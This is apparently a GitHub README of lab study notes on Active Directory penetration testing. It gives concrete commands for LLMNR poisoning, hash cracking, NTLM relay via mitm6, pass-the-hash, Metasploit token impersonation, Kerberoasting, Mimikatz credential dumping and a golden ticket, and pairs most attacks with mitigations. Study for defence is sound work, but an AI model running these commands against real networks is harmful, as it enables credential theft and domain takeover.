# ActiveDirectoryHack
Methods to gain DA as well as post-compromise enumeration.

#

<br/>

<p align="center">
  <body>
  LLMNR Poisoning Attack
  </body>
</p>

#

LLMNR Poisoning is a man in the middle attack where the threat actor uses a “responder” tool to listen to a victim’s incorrect request for a website, as in misspelling the name or something like that. It is called an event when the responder receives this incorrect request. 

When an event occurs, the threat actor is able to receive the victim’s ip address, username, and hash of their password. The hash is an encryption device created for a password designed to protect the password by concealing the true password with random alphanumeric characters. 

The true password can be revealed using a tool that undoes the hash protecting the password.

#

On Kali Linux terminal, run responder by using the command ‘responder -I eth0 -dwv’.

On a Windows 10 x64 machine, type ‘\\192.168.254.128’ into the file explorer address bar.

This gets you the following from the responder:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(3).png)


Now that we have the username and password hash, we can crack the password using a tool like hashcat.

Copy the hash and save it to a file (named hashes.txt for example) on your default operating system (can do machine but default is faster) within the same folder the hashcat.exe is in.

Include any word list to compare the hash to in the same folder like rockyou.txt, a hashcat word list, or the SecList on github.

Then run hashcat on command prompt in administrator mode by using the command ‘hashcat.exe -m 5600 hashes.txt rockyou.txt -O’. 5600 is a type of hash for NTLM and the -O switch just optimizes the command.

This gets you the following from hashcat:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(4).png)

The password was revealed to be Password1.
<br/>
<br/>

#

<p align="center">
  <body>
  LLMNR Poisoning Mitigation
  </body>
</p>

#

LLMNR Poisoning can be mitigated by disabling LLMNR and NBT-NS as well, as that is the next poisoner the responder the attacker is using will try.
* To disable LLMNR, open the Group Policy Editor and follow the path Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client and select “Turn OFF Multicast Name Resolution”
* To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select “Disable NetBIOS over TCP/IP”

If LLMNR/NBT-NS cannot be disabled or must be used, then:
* Require Network Access Control
* Require long and complex passwords above 14 characters.
<br/>
<br/>

#

<p align="center">
  <body>
  SMB Relay Attack (unfinished)
  </body>
</p>

#

SMB Relay Attack is similar to the LLMNR Poisoning attack but instead of taking password hashes offline and cracking them, we can relay them to another machine.

Requirements:
* SMB signing must be disabled on the target
* Relayed user credentials must be admin on the machine

‘nmap --script=smb2-security-mode.nse’ 
smb2-security-mode = name of script
nse = nmap security 

‘ntlmrelayx.py -tf targets.txt -smb2support’

#

<p align="center">
  <body>
  SMB Relay Mitigation
  </body>
</p>

#

Enable SMB Signing on all devices
Disable NTLM authentication on Network
Account tiering (admin logs into controller only, not user accounts)
Local admin restriction (prevents lateral movement, but ends up in more service tickets)

<br/>

#

<p align="center">
  <body>
  IPv6 Attack
  </body>
</p>

#

IPv6 Attack is a DNS takeover that takes advantage of the fact that computers sometimes have IPv6 but don’t use it. The threat actor listens for an event during communication between computers and then we find valuable information, which is in the form of ntlm. This gets relayed to the domain controller via ldaps which then creates an account we can use to log in.

#

On Kali Linux terminal, cd into the mitm6 folder and run mitm6 by using the command ‘mitm6 -d marvel.local’, where marvel.local is a domain. This will start sending spoofed replies on the network.

Then we set up the relay attack using ntlm with the following command
‘ntlmrelayx.py -6 -t ldaps://192.168.254.129 -wh fakewpad.marvel.local -l lootme’

-6 is the IPv6 switch
-t for targeting ldaps pointing to the domain controller ip address
-wh for the wpad
-l for dumping “loot” (information) into a folder “lootme”

Then to speed it up, just reboot a machine connected to the domain controller to trigger an event for mitm6. Once this happens, we wait to see an authentication success from running ntlm, which we can then check the lootme folder.

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(5).png)

Opening domain_users_by_group.html gives us the following:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(6).png)

Once the admin logs into the domain controller, it will create a new user and password:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(7).png)

Then you should see the new account in the domain controller:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(8).png)

#

<p align="center">
  <body>
  IPv6 Takeover Attack Mitigation
  </body>
</p>

#

Disable IPv6 is a guaranteed mitigation method, but is not recommended.
If IPv6 is not in use, the best steps are to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via group policy.
Change the following from allow to block:
* (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPv6-In)
* (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
* (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPv6-Out)
Additional mitigations:
* If WPAD is not in use, disable it using Group Policy and by disabling the WinHttpAutoProxySvc service.
* Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding
* Consider adding Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which prevents impersonation of that user via delegation


#

<p align="center">
  <body>
  Passback Attack
  </body>
</p>

#

A passback attack is where you intercept login credentials from devices such as printers that might require a log in to be used on the network. Just set up a responder or netcat to listen for such events and capture the credentials.

One scenario of this attack happening is if a printer has to be able to scan from the printer to the computer. This might be through SMB and so anyone who needs to run these scans might be made domain admin.

[https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)

#

<p align="center">
  <body>
  Strategy Checkboxes
  </body>
</p>

#
Start early in the day with mitm6 or responder where users become online in the morning
Run scans to generate traffic
If scans are taking too long, look for websites in scope (http_version)
If there’s a login page for things like printers or Jenkins, look up the page and find default user/pw
* dont just focus on the exploit, gather as much info as possible and think outside the box

# Post-compromise Enumeration

<p align="center">
  <body>
  PowerView
  </body>
</p>

#

Turn off execution policy using ‘powershell -ep bypass’.

Run the program using ‘. .\PowerView.ps1’.

Use ‘Get-NetDomain’ to show domain layout. Use ‘Get-NetDomainController’ for DC information.

View policies using ‘Get-DomainPolicy’. 

Look at system access using ‘(Get-Domainpolicy).“system access”’

Show all the users using ‘Get-NetUser’. Pipeline it with ‘Get-NetUser | select cn’ to show only usernames to reduce clutter. (other options: ‘select samaccountname’, ‘select description’.

Use ‘Get-UserProperty -Properties pwdlastset’ to see when a password was last set.

If you want to identify possible honeypot accounts, use ‘Get-UserProperty -Properties logoncount’
If you want to see if an account has been possibly attacked, use ‘Get-UserProperty -Properties badpwdcount’.

Use ‘Get-NetComputer’ to find computers or ‘Get-NetComputer -FullData’ for extra info. Can pipeline with ‘| select OperatingSystem’ to list only operating systems.

Use ‘Get-NetGroup’ for a list of groups and ‘Get-NetGroup -GroupName “Domain Admins”’ for the domain admins group. Can also use wildcard with ‘Get-NetGroup -GroupName *admin*’ to see all admin group names.

Use ‘Get-NetGroupMember -GroupName “Domain Admins”’ to get all domain admins.

Find all the SMB share files using ‘Invoke-ShareFinder’.

Use ‘Get-NetGPO’ for group policies. Narrow it down with ‘Get-NetGPO | select displayname, whenchanged’.

#

<p align="center">
  <body>
  Bloodhound
  </body>
</p>

#

Turn off execution policy using ‘powershell -ep bypass’.

Run bloodhound with ‘. .\SharpHound.ps1’.

Run ingestor ‘Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local ZipFileName file.zip’.

Copy this zip file to Kali and upload the data to bloodhound.

You can see the shortest path to domain is through the circled user:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(9).png)

You can also see high value targets as well:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(10).png)

#

<p align="center">
  <body>
  Pass the Hash/Password Attack
  </body>
</p>

#

This attack is a post-compromise attack that passes a compromised hash/password and “passes” it around the other users connected to the domain to see if other accounts use the same password.

We install and use a tool called “crackmapexec” and run the command ‘crackmapexec 192.168.57.0./24 -u fcastle -d MARVEL.local -p Password1’ with a specified domain IP address, user, domain name, and compromised password:


![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(11).png)

This shows us that the users SPIDERMAN and THEPUNISHER has the same password as the compromised password we specified. HYDRA-DC did not work because there’s no SMB access.

Then we can use psexec to gain remote access to a user, where “marvel/fcastle” is the user, “Password1” is the password, and the IP of the target machine is “192.168.254.130”:


![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(12).png)

*Note: there is a lockout policy on domain accounts where testing multiple passwords can lock you out of the account, but local accounts do not have this lockout policy.

You can then find the hashes of the accounts on the domain using ‘secretsdump.py marvel/fcastle:Password1@192.168.254.130’ which has the same syntax as the psexec command, which gets you the following:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(13).png)
You can take these hashes offline and crack them by putting them in a txt file and running the command ‘hashcat64.exe -m 1000 hashes.txt rockyou.txt -O’:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(14).png)

*One of the passwords is hidden possibly because the account is disabled.

#

<p align="center">
  <body>
  Pass the Hash/Password Mitigation
  </body>
</p>

#

You can limit account re-use:
* Avoid re-using local admin password
* Disable guest and administrator accounts
* Limit who is the local administrator (least-privilege)
Use strong passwords:
* greater than 14 characters
*  common words
Privilege Access Management (PAM):
* Check out/in sensitive accounts when needed
* Automatically rotate passwords on check out and check in


#

<p align="center">
  <body>
  Token Impersonation (Incognito) Attack
  </body>
</p>

#


Tokens give you temporary access just like cookies. 
Two types:
Delegate tokens are used when you login to a machine or use remote desktop. 
Impersonate tokens are used when there is a network drive attached or domain logon script

#

We run metasploit using ‘msfconsole’.
Configure the payload using ‘use exploit/windows/smb/psexec’.
Set rhosts to the target using ‘set rhosts <ip>’.
Set smbdomain using ‘set smbdomain marvel.local’.
Set smbpass using ‘set smbpass Password1’.
Set smbuser using ‘set smbuser fcastle’.
Use ‘show targets’ and set target to native upload using ‘set target 2’.
Set lhost using ‘set lhost eth0’.
Using ‘options’:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(15).png)

Then use ‘run’ to start the session.

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(16).png)


We can use ‘hashdump’ to see the hashes.
Use commands like ‘getuid’ and ‘sysinfo’ to see information about the user.
Use ‘load -l’ to see a list of tools.


We’ll use incognito by doing ‘load incognito’. Use ‘help’ for list of commands.

List tokens by usernames using ‘list_tokens -u’.
Then impersonate a token by using ‘impersonate_token marvel\\fcastle’.


![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(17).png)

*note. Use ‘rev2self’ to go back to meterpreter.

#

<p align="center">
  <body>
  Token Impersonation Mitigation
  </body>
</p>

#

You can mitigate token impersonation attacks with the following:
* Limit user/group token creation permissions
* Account tiering (domain admins only login to DC for admin purposes and not local users)
* Local admin restriction (if users aren’t local admins on their computer, we can’t get shell access)

#

<p align="center">
  <body>
  Kerberoasting Attack
  </body>
</p>

#


Kerberoasting is an attack where the Kerberos ticket-granting ticket can be extracted and the threat actor can impersonate the user.

We can start by retrieving the hash from the SQL Service within the domain with the following command where we provide the domain IP: ‘GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.254.129 -request’.

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(18).png)

We can then take this hash offline and crack it using ‘hashcat.exe -m 13100 hashes4.txt rockyou.txt -O’

We can see that the password was successfully cracked and found to be “MYpassword123#”

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(19).png)

In this case, the SQL service account was mistakenly set as a domain admin, which opens a bunch of doors such as access to the domain controller.

#

<p align="center">
  <body>
  Kerberoasting Mitigation
  </body>
</p>

#

* Strong passwords
* Least privilege

#

<p align="center">
  <body>
  Group Policy Preferences (GPP) Attack (MS14-025) (unfinished)
  </body>
</p>

#


This attack was patched for issues going forward but it can still work on machines like windows 2012.
GPP allowed admins to create policies using certain encrypted credentials but they can be decrypted because the key was released accidentally.

*This vulnerability can be checked using metasploit and running ‘smb_enum_gpp’.
https://archive.ph/2021.01.08-171527/https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/#selection-425.223-430.0

#

<p align="center">
  <body>
  Mimikatz
  </body>
</p>

#

*Mimikatz version 2.2.0 20220919

This attack is a post DC compromised attack for persistence 

In cmd on the DC, we run mimikatz using ‘mimikatz.exe’ in the x64 folder, then run ‘privilege::debug’, which is needed to be able to bypass any protections in place.

Then we can run ‘sekurlsa::logonpasswords’ to get hashes of passwords of users that have logged on recently like the DC and administrators.

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(20).png)

*Note: if there’s enough time, we can use a feature called wdigest, which stores passwords in plaintext. This feature has been patched but it’s still available to be turned on and it will show passwords for whoever logs in next.

Using ‘lsadump::lsa /patch’ allows you to dump the lsa (local security authority), which is a logon session authenticator:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(21).png)


You can see that it dumps usernames and NTLM hashes for those usernames, which can be taken offline and cracked.

This method is good for determining how good or bad the company password policies are, depending on how many passwords we can crack.

As you might infer, the best mitigation for this attack is strong passwords.

#

<p align="center">
  <body>
  Golden Ticket Attack
  </body>
</p>

#


The golden ticket is access to the Kerberos ticket granting account, meaning we have access to everything.

Start by running mimikatz with ‘mimikatz.exe’ and then using ‘privilege::debug’ again.
Then use ‘lsadump::lsa /inject /name:krbtgt’, where krbtgt stands for kerberos ticket granting ticket.

This will show a bunch of hashes as well as wdigest:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(22).png)

Not the following information:
Domain SID:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(23).png)

krbtgt NTLM hash:

![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(24).png)


In order to generate the golden ticket we use the command and the above information ‘kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-3103577861-2553214869-2910503120 /krbtgt:7380a637b4fed63264d3d9e161b87c7b /id:500 /ptt’

/id:500 means an id of the administrator
/ptt stands for pass the ticket

Now we can access other computers and their directories like the computer THEPUNISHER for example. Using ‘misc::cmd’ to open another cmd with the same session then ‘dir \\THEPUNISHER\c$’


![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(25).png)



Taking this further, we can run psexec if we have it installed to launch a shell for THEPUNISHER, giving us complete access.

Mitigation:

As far as I know, you can mitigate this by changing the Kerberos Ticket Granting Ticket (KRBTGT) password *TWICE* to prevent the takeover. Change the password twice because of Microsoft's password history settings.

#

<p align="center">
  <body>
  Silver Ticket Attack (unfinished)
  </body>
</p>

#
